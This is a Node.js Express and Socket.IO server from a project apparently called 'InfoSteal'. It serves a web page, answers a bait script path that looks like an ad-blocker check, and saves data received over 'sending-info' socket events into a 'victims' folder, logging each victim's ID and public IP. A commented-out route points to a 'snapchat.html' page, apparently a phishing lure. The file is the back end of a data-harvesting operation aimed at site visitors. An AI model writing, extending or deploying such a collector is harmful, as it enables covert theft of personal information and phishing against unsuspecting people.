  /*
TODO:
- LOG ACTUAL DATA
- ADD SERVER SIDE INFO ABOUT CLIENT (HEADERS AND STUFF)
*/
const config = require('./config.js');
const express = require('express');
const app = express();
const http = require('http')
const auth = require('basic-auth');
const colors = require('colors');
const fs = require('fs');

//Logging functions
const log = {
    error: function(data) {
        var date = new Date();
        console.log('ERROR'.red, data);
    },
    info: function(data) {
        var date = new Date();
        console.log('INFO'.green, data);
    },
    warn: function(data) {
        var date = new Date();
        console.log('WARN'.yellow, data);
    },
    debug: function(data) {
        console.log('DEBUG'.blue, data);
    }
}

const server = http.createServer(app).listen(config.web.port, function() {
    log.info("Express server listening on port " + config.web.port);
});

server.listen(config.web.port);

//SOCKET.IO INIT
var io = require('socket.io')(server)

app.use(express.static(__dirname + '/web'));

app.get('/', function(req, res) {
    res.sendFile('/home/ubuntu/InfoSteal/web/index.html');
});

app.get('/img/i/ab/0.js', function(req, res){
    res.send('var ab0=1')
});

// app.get('/snapchat/*', function(req, res){
//   res.sendFile('/home/ubuntu/InfoSteal/web/snapchat.html')
// })

//Custom 404
app.use(function(req, res) {
    res.send('404: Page not Found').status(404);
    log.warn(req.connection.remoteAddress + " [404] GET " + req.url)
});

io.on('connection', function(socket, next) {
    log.info(socket.handshake.address + " has connected.")

    socket.on('sending-info', function(data){
      var jsondata = JSON.stringify(data)
      fs.writeFileSync(__dirname + "/victims/" + data.victimid + ".json", jsondata, console.log(data.victimid + "'s data got saved. Basic info: IP(" + data.publicip + ")")) 
    })
})
